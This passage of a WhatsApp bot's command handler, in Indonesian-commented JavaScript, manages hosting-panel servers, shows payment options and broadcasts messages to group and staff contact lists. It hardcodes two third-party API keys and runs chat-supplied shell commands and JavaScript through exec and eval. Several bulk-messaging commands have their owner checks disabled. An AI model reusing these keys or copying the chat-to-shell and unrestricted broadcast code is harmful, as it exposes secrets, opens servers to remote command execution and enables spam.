        let f = await fetch(domain + "/api/application/servers?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        });
        let res = await f.json();
        let servers = res.data;
        if (servers.length < 1) return SkyReply("Tidak Ada Server Bot")
        let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
        for (let server of servers) {
          let s = server.attributes
          let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
            "method": "GET",
            "headers": {
              "Accept": "application/json",
              "Content-Type": "application/json",
              "Authorization": "Bearer " + capikey
            }
          })
          let data = await f3.json();
          let status = data.attributes ? data.attributes.current_state : s.status;
          messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
        }

        messageText += ` Total Server : *${res.meta.pagination.count} Server*`;

        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender]
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: messageText
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buat Server Panel\",\"title\":\"Buat Panel\",\"id\":\".cpanel\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Hapus Server Panel\",\"title\":\"Hapus Panel\",\"id\":\".delpanel\"}"
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "delpanel": {
        let kontol = new Array()
        let f = await fetch(domain + "/api/application/servers?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        });
        let res = await f.json();
        let servers = res.data;
        if (servers.length < 1) return SkyReply("Tidak Ada Server Bot")
        for (let server of servers) {
          let s = server.attributes
          let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
            "method": "GET",
            "headers": {
              "Accept": "application/json",
              "Content-Type": "application/json",
              "Authorization": "Bearer " + capikey
            }
          })
          let data = await f3.json();
          let status = data.attributes ? data.attributes.current_state : s.status
          let namanya = `${s.name}`
          let idnya = `${s.id} ⚡`
          let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
          let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
          let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
          await kontol.push({
            header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`
          })
        }
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: '\nSilahkan Pilih *Server Panel* Yang Ingin Kamu Hapus, Untuk Melihat Lebih Detail Info Server Ketik *.listpanel*'
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "single_select",
                    "buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}"
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "respon_delpanel": {
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        if (global.apikey.length < 1) return SkyReply("Apikey Tidak Ditemukan!")
        if (!args[0]) return SkyReply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
        let f = await fetch(domain + "/api/application/servers?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let result = await f.json()
        let servers = result.data
        let sections = []
        for (let server of servers) {
          let s = server.attributes
          if (args[0] == s.id.toString()) {
            sections.push(s.name.toLowerCase())
            let f = await fetch(domain + `/api/application/servers/${s.id}`, {
              "method": "DELETE",
              "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
              }
            })
            let res = f.ok ? {
              errors: null
            } : await f.json()
          }
        }
        let cek = await fetch(domain + "/api/application/users?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let res2 = await cek.json();
        let users = res2.data;
        for (let user of users) {
          let u = user.attributes
          if (sections.includes(u.username)) {
            let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
              "method": "DELETE",
              "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
              }
            })
            let res = delusr.ok ? {
              errors: null
            } : await delusr.json()
          }
        }
        if (sections.length == 0) return SkyReply("*ID Server/User* Tidak Ditemukan")
        SkyReply(`*Berhasil Menghapus Akun Panel ✅*
Nama Server : *${capital(sections[0])}*`)
      }
        break
      case "sendpayment": case "payment": case "pay": case "listpayment": {
        if (!isOwner) return SkyReply(msg.owner)
        let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/Reza.jpg") }, { upload: Reza.waUploadToServer })
        let imgqr = await prepareWAMessageMedia({ image: await global.qris }, { upload: Reza.waUploadToServer })
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "Pilih *Payment Pembayaran* Yang Tersedia Di Bawah Ini ⬇️"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [{
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `*Dana Payment*

*Nomor :* ${global.dana}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Copy Nomor Dana\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `*OVO Payment*

*Nomor :* ${global.ovo}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Copy Nomor Ovo\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `*Gopay Payment*

*Nomor :* ${global.gopay}`,
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Copy Nomor Gopay\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `*QRIS All Payment*

Scan Foto QRIS All Payment Dibawah Ini`,
                      hasMediaAttachment: true,
                      ...imgqr
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        "name": "quick_reply",
                        "buttonParamsJson": "{\"display_text\":\"https://telegra.ph/file/05dcbeb5ba659917a2417.jpg\",\"title\":\"QRIS Payment\",\"id\":\".mn\"}"
                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                      },

                      {

                        "name": "cta_url",

                        "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qpayment })
        await Reza.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
      }
        break
      case "ambilq": {
        let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2)
        SkyReply(jsonData)
      }
        break
      case "kataaja": {
        // const fetch = require('node-fetch'); // Jika di Node.js
        const apiUrl = 'https://api.api-ninjas.com/v1/quotes';
        const apiKey = `FBGlRKzO7asZ4/r8eq1AuA==2CO4MrbIdQ0jcp7P`;
        try {
          const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'X-Api-Key': apiKey
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json(); // bisa juga pakai .json() tergantung response

          const teks = `"${data[0].quote}"\n\n— ${data[0].author}`;; // isi response dijadikan teks
          await Reza.sendMessage(m.chat, {
            text: teks
          });

        } catch (error) {
          console.error('Fetch error:', error);
        }
        // Reza.sendMessage(m.chat, { text: teks, mentions: [...member] })

      }
        break
      case "bucin": {
        // const fetch = require('node-fetch'); // Jika di Node.js
        const apiKey = `3eb1d2a4e664488078aac593`;
        const apiUrl = `https://api.lolhuman.xyz/api/random/bucin?apikey=${apiKey}`;
        try {
          const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'X-Api-Key': apiKey
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json(); // bisa juga pakai .json() tergantung response

          const teks = `"${data.result}"`;; // isi response dijadikan teks
          await Reza.sendMessage(m.chat, {
            text: teks
          });

        } catch (error) {
          console.error('Fetch error:', error);
        }
        // Reza.sendMessage(m.chat, { text: teks, mentions: [...member] })

      }
        break
      case "galau2": {
        const randomBucin = pickRandom(bucin)
        var judul = `./all/soundgalau/${getRandom2(".mp3")}`
        await Reza.sendMessage(m.chat, { text: randomBucin })
        await Reza.sendMessage(m.chat, { audio: fs.readFileSync(judul), mimetype: 'audio/mpeg' })
      }
        break
      case "salam": {
        teks = `Selamat ${ucapan()}`
        await Reza.sendMessage(m.chat, { text: teks })
      }
        break
      case "listlore": {
        // const lore = require('./all/database/lore.json');
        const lore = JSON.parse(fs.readFileSync('./all/database/lore.json', 'utf8'));
        listlore = lore.join('\n');
        await Reza.sendMessage(m.chat, { text: listlore })
      }
        break
      case "addlore": {
        const data = JSON.parse(fs.readFileSync('./all/database/lore.json', 'utf8'));
        data.push(text);
        fs.writeFileSync('./all/database/lore.json', JSON.stringify(data, null, 2), 'utf8');
        await Reza.sendMessage(m.chat, { text: "Berhasil Menambahkan Lore Baru:v" })
      }
        break
      // case "deletelore":{
      //   const data = JSON.parse(fs.readFileSync('./all/database/lore.json', 'utf8'));
      //   data.p
      //   fs.writeFileSync('./all/database/lore.json', JSON.stringify(data, null, 2), 'utf8');
      //   await Reza.sendMessage(m.chat, {text: "Berhasil Menambahkan Lore Baru:v"})
      // }
      case "siaran": {
        // if (!isOwner) return SkyReply(msg.owner)
        // if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let time = ms(delaypushkontak * Number(halls.length))
        await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of halls) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "siaran1": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        if (!text.split("|")) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var [nomorgrup, teks] = text.split("|")
        idnya = grupgenius[nomorgrup - 1]
        var groupMetadataa
        try {
          groupMetadataa = await Reza.groupMetadata(`${idnya}`)
        } catch (e) {
          return SkyReply("*No Grup* tidak valid!")
        }
        const participants = await groupMetadataa.participants
        const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let time = ms(delaypushkontak * Number(halls.length))
        await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of halls) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "ambilnomor": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        if (!text.split("|")) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var [nomorgrup, teks] = text.split("|")
        idnya = grupgenius[nomorgrup - 1]
        var groupMetadataa
        try {
          groupMetadataa = await Reza.groupMetadata(`${idnya}`)
        } catch (e) {
          return SkyReply("*No Grup* tidak valid!")
        }
        const participants = await groupMetadataa.participants
        const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        // let time = ms(delaypushkontak * Number(halls.length))
        // await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*`)
        for (let mem of halls) {
          // if (mem !== m.sender) {
          //   contacts.push(mem)
          //   await Reza.sendMessage(mem, { text: teks }, { quoted: qchanel })
          //   await sleep(global.delaypushkontak)
          // }
          console.log(mem)
        }
      }
        break
      case "idolnurse": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        await SkyReply(`Proses Mengirim Pesan Ke *Idol Nurse*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of idolnurse) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "ambassador": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        await SkyReply(`Proses Mengirim Pesan Ke *Ambassador*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of ambassador) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "techsmith": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        await SkyReply(`Proses Mengirim Pesan Ke *Techsmith*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of techsmith) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "eselon": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        await SkyReply(`Proses Mengirim Pesan Ke *Eselon*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (let mem of eselon) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: fulltext })
            await sleep(global.delaypushkontak)
          }
        }
        await SkyReply(`Proses Selesai`)
      }
        break
      case "sa": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        await SkyReply(`Proses Mengirim Pesan Ke *Starlight Alliance*`)
        for (let mem of sa) {
          if (mem !== m.sender) {
            await Reza.sendMessage(mem, { text: teks })
            await sleep(global.delaypushkontak)
          }
        }
      }
        break
      case "grupgenius": {
        SkyReply(`1. WELCOME TO THE FAMILY 🫶✨🌸🌸🌸
2. ✩⁺₊✩☽⋆TECHSMITH AREA⚠️⚠️⋆☾✩⁺₊✩
3. ⋆˚｡⋆୨✧୧˚ 𝑰𝒅𝒐𝒍 𝑵𝒖𝒓𝒔𝒆 ˚୨✧୧⋆｡˚⋆
4. ꧁✬◦°⋆⋆°◦. 𝓐𝓶𝓫𝓪𝓼𝓼𝓪𝓭𝓸𝓻 ◦°⋆⋆°◦✬꧂
5. ꧁♦★ Subdiv Editor ★♦꧂
6. ꧁♦★ Subdiv Marketing ★♦꧂
7. ꧁♦★ Subdiv Publikasi ★♦꧂`)
      }
        break
      // case "pesankegrup": {
      //   // if (!isOwner) return SkyReply(msg.owner)
      //   if (!text && !m.quoted) return SkyReply(example("teksnya atau replyteks"))
      //   var teks = m.quoted ? m.quoted.text : text
      //   let total = 0
      //   let getGroups = await Reza.groupFetchAllParticipating()
      //   let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
      //   let usergc = groups.map((v) => v.id)
      //   let time = ms(delayjpm * Number(usergc.length))
      //   //       await SkyReply(`Proses Mengirim Pesan Hidetag Teks Ke *${usergc.length} Grup*

      //   // *Waktu Selsai :*
      //   // ${time.minutes} menit, ${time.seconds} detik`)
      //   var ments = []
      //   // let msgii = generateWAMessageFromContent(m.chat, {
      //   //   viewOnceMessage: {
      //   //     message: {
      //   //       "messageContextInfo": {
      //   //         "deviceListMetadata": {},
      //   //         "deviceListMetadataVersion": 2
      //   //       },
      //   //       interactiveMessage: proto.Message.InteractiveMessage.create({
      //   //         contextInfo: {
      //   //           mentionedJid: ments,
      //   //           externalAdReply: {
      //   //             showAdAttribution: false
      //   //           }
      //   //         }, body: proto.Message.InteractiveMessage.Body.create({
      //   //           text: teks
      //   //         }),
      //   //         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      //   //           buttons: [{
      //   //             "name": "cta_url",
      //   //             "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
      //   //           }, {
      //   //             "name": "cta_url",
      //   //             "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
      //   //           },
      //   //           {
      //   //             "name": "cta_url",
      //   //             "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
      //   //           }]
      //   //         }),
      //   //       })
      //   //     }
      //   //   }
      //   // }, { userJid: m.sender, quoted: qtoko })
      //   // for (let jid of usergc) {
      //   //   try {
      //   //     ments = getGroups[jid].participants.map(e => e.id)
      //   //     // await Reza.relayMessage(jid, msgii.message, {
      //   //     //   messageId: msgii.key.id
      //   //     // })
      //   //     console.log(getGroups)
      //   //     console.log(jid)
      //   //     total += 1
      //   //   } catch (e) {
      //   //     console.log(e)
      //   //   }
      //   //   // await sleep(global.delayjpm)
      //   // }
      //   console.log(getGroups)
      //   SkyReply(`Berhasil Mengirim Pesan Hidetag Teks Ke *${total} Grup*`)
      // }
      //   break
      case "pesankegrup": case "psg": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        if (!text.split("|")) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var [nomorgrup, teks] = text.split("|")
        let getGroups = await Reza.groupFetchAllParticipating()
        // let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        // let usergc = groups.map((v) => v.id)
        idnya = grupgenius[nomorgrup - 1]
        ments = getGroups[idnya].participants.map(e => e.id)
        await SkyReply(`Proses Mengirim Pesan Ke Grup *${getGroups[idnya].subject}*`)
        fulltext = `${teks}

Message From: *${staffgeniuscontact[m.sender]}*`
        await Reza.sendMessage(idnya, { text: fulltext, mentions: ments })
        await SkyReply(`Proses Selesai`)
      }
        break
      case "pesankegruptanpatag": case "psg2": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        if (!text.split("|")) return SkyReply(example("nomorgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var [nomorgrup, teks] = text.split("|")
        let getGroups = await Reza.groupFetchAllParticipating()
        // let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
        // let usergc = groups.map((v) => v.id)
        idnya = grupgenius[nomorgrup - 1]
        await SkyReply(`Proses Mengirim Pesan Ke Grup *${getGroups[idnya].subject}*`)
        fulltext = `${teks}
  
  Message From: *${staffgeniuscontact[m.sender]}*`
        await Reza.sendMessage(idnya, { text: fulltext })
        await SkyReply(`Proses Selesai`)
      }
        break
      case "pesan": {
        await Reza.sendMessage(m.chat, { text: text })
      }
        break
      case "geniusstaffcontact": case "sgc": {
        var fulltext = ""
        var count = 1
        for (g in staffgeniuscontact) {
          fulltext += `${count}. +${g.split("@")[0]} - ${staffgeniuscontact[g]}\n`
          count++
        }
        await Reza.sendMessage(m.chat, { text: fulltext })
      }
        break
      case "sendmessage": case "smsg": {
        if (!text) return SkyReply(example("nomorstaff|pesannya\nketik *.geniusstaffcontact* untuk melihat semua list kontak staff genius\nContoh Penggunaan: .smsg 20|sayang"))
        if (!text.split("|")) return SkyReply(example("nomorstaff|pesannya\nketik *.geniusstaffcontact* untuk melihat semua list kontak staff genius\nContoh Penggunaan: .smsg 20|sayang"))
        if (!text.split(",")) return SkyReply(example("nomorstaff|pesannya\nketik *.geniusstaffcontact* untuk melihat semua list kontak staff genius\nContoh Penggunaan: .smsg 20|sayang"))
        var resultsplit = text.split("|")[1]
        var number = text.split("|")[0].split(",")
        var reply = `Proses Mengirim Pesan Ke Nomor`
        var tujuan = ""
        for (p of number) {
          tujuan += `${staffgeniuscontact[Object.keys(staffgeniuscontact)[p - 1]]}\n`
        }
        console.log(tujuan)
        await SkyReply(`Proses Mengirim Pesan Ke Nomor ${tujuan}`)
        fulltext = `${resultsplit}

Message From: *${staffgeniuscontact[m.sender]}*`
        for (n of number) {
          // var sendto = staffgeniuscontact
          await Reza.sendMessage(Object.keys(staffgeniuscontact)[n - 1], { text: fulltext })
          await sleep(global.delaypushkontak)
        }
        await SkyReply("Proses Selesai")

      }
        break
      default:
        if (budy.startsWith('$')) {
          if (!isOwner) return
          exec(budy.slice(2), (err, stdout) => {
            if (err) return Reza.sendMessage(m.chat, { text: err.toString() }, { quoted: m })
            if (stdout) return Reza.sendMessage(m.chat, { text: util.format(stdout) }, { quoted: m })
          })
        }

        if (budy.startsWith(">")) {
          if (!isOwner) return
          try {
            let evaled = await eval(text)
            if (typeof evaled !== 'string') evaled = util.inspect(evaled)
            Reza.sendMessage(m.chat, { text: util.format(evaled) }, { quoted: m })
          } catch (e) {
            Reza.sendMessage(m.chat, { text: util.format(e) }, { quoted: m })
          }
        }

        if (budy.startsWith("=>")) {
          if (!isOwner) return
          try {
            const evaling = await eval(`;(async () => { ${text} })();`);
            return Reza.sendMessage(m.chat, { text: util.format(evaling) }, { quoted: m })
          } catch (e) {
            return Reza.sendMessage(m.chat, { text: util.format(e) }, { quoted: m })
          }
        }

    }
  } catch (e) {
    console.log(e)
    Reza.sendMessage(`${owner}@s.whatsapp.net`, {
      text: `${util.format(e)}

Command From : ${m.sender.split("@")[0]}`
    }, { quoted: m })
  }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
})

// setInterval(() => {
//   console.log(`[KEEP ALIVE] Bot masih aktif - ${new Date().toLocaleTimeString()}`);
// }, 1000 * 60);